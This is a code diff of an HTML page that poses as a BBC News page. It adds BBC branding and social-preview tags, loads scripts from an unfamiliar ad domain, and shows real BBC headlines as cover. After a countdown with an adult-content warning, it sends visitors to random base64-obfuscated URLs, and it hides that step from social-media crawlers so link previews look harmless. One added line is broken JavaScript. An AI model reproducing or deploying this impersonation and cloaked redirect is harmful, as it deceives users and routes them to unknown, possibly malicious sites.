@@ -2,8 +2,14 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>News Updates</title>
+  <title>BBC News - World Updates</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Breaking News: Global Market Updates and Daily Reports" />
+  <meta property="og:description" content="Read the latest news from around the world. Updated constantly." />
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/62/BBC_News_2019.svg/1200px-BBC_News_2019.svg.png" />
+  <meta property="og:url" content="https://xbling.vercel.app" />
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,96 +18,58 @@
       padding: 20px;
       background: #f0f2f5;
       color: #333;
-      
     }
-    .banner {
-      text-align: center;
-      margin-bottom: 20px;
+   
+    .banner, .simple-countdown, .news-container {
+       
     }
+    
+    .banner { text-align: center; margin-bottom: 20px; }
     .simple-countdown {
-      text-align: center;
-      background: #ff4444;
-      color: white;
-      padding: 15px;
-      border-radius: 8px;
-      margin-bottom: 20px;
+      text-align: center; background: #ff4444; color: white;
+      padding: 15px; border-radius: 8px; margin-bottom: 20px;
     }
-    .countdown-number {
-      font-size: 2rem;
-      font-weight: bold;
-      margin: 5px 0;
-    }
+    .countdown-number { font-size: 2rem; font-weight: bold; margin: 5px 0; }
     .subdomain-info {
-      background: #e9ecef;
-      padding: 10px;
-      border-radius: 8px;
-      margin: 10px 0;
-      text-align: center;
-      font-family: monospace;
+      background: #e9ecef; padding: 10px; border-radius: 8px;
+      margin: 10px 0; text-align: center; font-family: monospace;
     }
     .news-container {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
+      background: white; padding: 20px; border-radius: 10px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
     .news-item {
-      display: flex;
-      align-items: flex-start;
-      background: #f8f9fa;
-      margin: 10px 0;
-      padding: 12px;
-      border-radius: 8px;
-      border-left: 4px solid #4285f4;
-      gap: 12px;
+      display: flex; align-items: flex-start; background: #f8f9fa;
+      margin: 10px 0; padding: 12px; border-radius: 8px;
+      border-left: 4px solid #4285f4; gap: 12px;
     }
     .news-thumb {
-      flex-shrink: 0;
-      width: 100px;
-      height: 70px;
-      border-radius: 6px;
-      object-fit: cover;
+      flex-shrink: 0; width: 100px; height: 70px;
+      border-radius: 6px; object-fit: cover;
     }
-    .news-content {
-      flex: 1;
-    }
+    .news-content { flex: 1; }
     .news-title a {
-      text-decoration: none;
-      color: #333;
-      font-weight: 600;
-      line-height: 1.4;
-    }
-    .news-title a:hover {
-      color: #1a73e8;
+      text-decoration: none; color: #333; font-weight: 600; line-height: 1.4;
     }
     .news-meta {
-      font-size: 0.8rem;
-      color: #666;
-      margin-top: 4px;
-      display: flex;
-      justify-content: space-between;
+      font-size: 0.8rem; color: #666; margin-top: 4px;
+      display: flex; justify-content: space-between;
     }
-    .loading {
-      text-align: center;
-      padding: 20px;
-      color: #666;
-    }
+    .loading { text-align: center; padding: 20px; color: #666; }
   </style>
 </head>
 <body>
+  
   <div class="banner" id="banner-area">
-    <script 
-      data-cfasync="false" 
-      src="//intermediategillsevent.com/5ea19394c3fddc8b0f8e646b3ce703b5/invoke.js"
-      onload="initPageAfterBanner()"
-      onerror="initPageAfterBanner(true)">
-    </script>
+    <script data-cfasync="false" src="//intermediategillsevent.com/5ea19394c3fddc8b0f8e646b3ce703b5/invoke.js" onload="checkAdLoaded()" onerror="checkAdLoaded()"></script>
     <div id="container-5ea19394c3fddc8b0f8e646b3ce703b5"></div>
   </div>
 
+  <script type='text/javascript' src='//intermediategillsevent.com/fc/f3/e8/fcf3e8259b74a93f9d1a00913fadcdbb.js' onload="checkAdLoaded()" onerror="checkAdLoaded()"></script>
+
   <div class="simple-countdown" id="countdown-section">
     <div>Decoding... Just a little bit more until the door opens..</div>
-   <div class="countdown-number" id="countdown">5</div>
+    <div class="countdown-number" id="countdown">5</div>
     <div>Warning! The content you are about to watch may not be appropriate for viewers under 18 years old.</div>
   </div>
 
@@ -117,17 +85,32 @@
   </div>
 
   <script>
-    
-    window.initPageAfterBanner = function(error) {
-      try {
-        if (window.__bannerLoaded) return; 
-        window.__bannerLoaded = true;
-        clearTimeout(window.bannerTimeout);
 
-        console.log(error ? "Banner load failed or timed out" : "Banner loaded successfully");
-        document.body.style.display = "block"; 
+    window.loadedAdsCount = 0;
+    window.pageInitialized = false;
 
-        // encrypted targets (kept from original)
+    window.checkAdLoaded = function() {
+      window.loadedAdsCount++;
+      if (window.loadedAdsCount >= 2) { ads
+        runPageContent();
+      }
+    };
+
+    window.runPageContent = function(isTimeout) {
+      if (window.pageInitialized) return;
+      window.pageInitialized = true;
+      clearTimeout(window.bannerTimeout);
+      console.log(isTimeout ? "Timeout forced" : "Ads loaded");
+      
+     
+      startPageLogic();
+    };
+
+    window.bannerTimeout = setTimeout(() => {
+      window.runPageContent(true);
+    }, 4000); // 4s Timeout
+
+    function startPageLogic() {
         const ENCRYPTED_TARGETS = [
            'aHR0cHM6Ly94YmxpbmcuZ3QudGM=',
           'aHR0cHM6Ly94YmxpbmcuZ3QudGMvbGl2ZS1icm9hZGNhc3Q=',
@@ -140,66 +123,49 @@
         function decryptTarget(encrypted) {
           try { return atob(encrypted); } catch(e) { return '#'; }
         }
-
         function getRandomTarget() {
           const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
           return decryptTarget(ENCRYPTED_TARGETS[idx]);
         }
 
+      
         function isFacebookBot() {
           return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
         }
 
-      
         async function loadSimpleNews() {
           const container = document.getElementById('news-container');
-          const rssURL = 'https://api.rss2json.com/v1/api.json?rss_url=https://feeds.bbci.co.uk/news/rss.xml';
-
+       
+          const rssURL = 'https://api.rss2json.com/v1/api.json?rss_url=https://feeds.bbci.co.uk/news/rss.xml'; 
           try {
             const res = await fetch(rssURL);
             const data = await res.json();
-
-            if (!data.items || !data.items.length) {
-              container.innerHTML = '<div class="loading">No news found.</div>';
-              return;
-            }
-
+            if (!data.items || !data.items.length) return;
             let newsHTML = "";
             data.items.slice(0, 8).forEach(item => {
-              const title = item.title;
-              const link = item.link;
-              const pubDate = new Date(item.pubDate).toLocaleDateString();
-              const thumb = item.thumbnail || "https://placehold.co/100x70?text=News";
-
               newsHTML += `
                 <div class="news-item">
-                  <img class="news-thumb" src="${thumb}" alt="">
+                  <img class="news-thumb" src="${item.thumbnail || 'https://placehold.co/100x70?text=News'}" alt="">
                   <div class="news-content">
-                    <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
-                    <div class="news-meta">
-                      <span>${item.source?.title || "BBC News"}</span>
-                      <span>${pubDate}</span>
-                    </div>
+                    <div class="news-title"><a href="${item.link}" target="_blank">${item.title}</a></div>
+                    <div class="news-meta"><span>${item.source?.title || "BBC News"}</span></div>
                   </div>
-                </div>
-              `;
+                </div>`;
             });
-
             container.innerHTML = newsHTML;
-          } catch (err) {
-            console.error("RSS load error:", err);
-            container.innerHTML = '<div class="loading">⚠️ Unable to load news.</div>';
-          }
+          } catch (err) { console.error(err); }
         }
 
         function startCountdown() {
+         
           if (isFacebookBot()) {
             document.getElementById('countdown-section').style.display = 'none';
             document.getElementById('subdomain-info').style.display = 'none';
-            return;
+            return; 
           }
 
-          let seconds = 5;
+       
+          let seconds = 4;
           const countdownEl = document.getElementById('countdown');
           const timer = setInterval(() => {
             seconds--;
@@ -211,20 +177,9 @@
           }, 1000);
         }
 
-      
         loadSimpleNews();
         startCountdown();
-
-      } catch (e) {
-        console.error("Error during page init:", e);
-      }
-    };
-
-    // Timeout fallback
-    window.bannerTimeout = setTimeout(() => {
-      console.warn("Banner timeout after 5s — continuing page load...");
-      window.initPageAfterBanner(true);
-    }, 4000);
+    }
   </script>
 </body>
 </html>
